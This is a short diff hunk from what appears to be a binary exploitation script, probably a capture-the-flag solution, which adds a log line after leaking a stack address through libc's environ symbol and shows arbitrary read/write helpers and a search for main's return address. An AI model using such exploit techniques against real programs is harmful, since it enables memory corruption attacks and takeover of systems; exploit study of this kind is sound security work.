@@ -222,6 +222,7 @@ def arb_write_u64(address, val):
 
 
 stack_addr = arb_read_u64(libc.sym['environ'])
+log.success("leaked stack address %#x" % stack_addr)
 
 log.progress("searching for main's return address on the stack")
 main_func_size = binary.functions['main'].size
